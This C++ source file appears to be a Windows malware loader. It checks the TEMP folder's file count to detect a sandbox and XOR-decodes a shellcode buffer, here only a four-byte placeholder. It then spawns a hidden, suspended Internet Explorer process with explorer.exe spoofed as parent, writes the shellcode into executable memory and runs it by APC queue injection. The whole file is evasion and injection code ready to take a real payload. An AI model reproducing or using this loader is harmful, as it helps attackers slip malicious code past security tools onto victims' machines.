#include <Windows.h>
#include<stdio.h>
#include<string.h>
#include <fstream> 
#include <iostream>
#include <TlHelp32.h>


bool CheckTemp() {   //∑¥…≥œ‰
    int file_count = 0;
    DWORD dwRet;
    LPSTR pszOldVal;
    pszOldVal = (LPSTR)malloc(4096 * sizeof(char));
    dwRet = GetEnvironmentVariableA("TEMP", pszOldVal, 4096);

    std::string stdstr = pszOldVal;
    stdstr += "\\*";

    LPSTR s = const_cast<char*>(stdstr.c_str());

    WIN32_FIND_DATAA data;
    HANDLE hFind = FindFirstFileA(s, &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            file_count++;
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }
    printf("count:%d\n", file_count);
    if (file_count < 20)
        exit(1);
    else
        return true;
}

DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    CheckTemp();

    unsigned char key[] = "master";
    unsigned char shellcode[] = "\x91\x29\xf0\x90";

    int nLen = sizeof(shellcode)-1;
    int key_len = sizeof(key) - 1;
    for (int i = 0; i < nLen; i++)
    {
        shellcode[i] = shellcode[i] ^ key[i % key_len];

    }

    //PVOID p = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 
    //memcpy(p, shellcode, sizeof(shellcode));
    //((void(*)())p)();
    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());

    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), lpNumberOfBytesWritten);

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);
    return 0;
  
}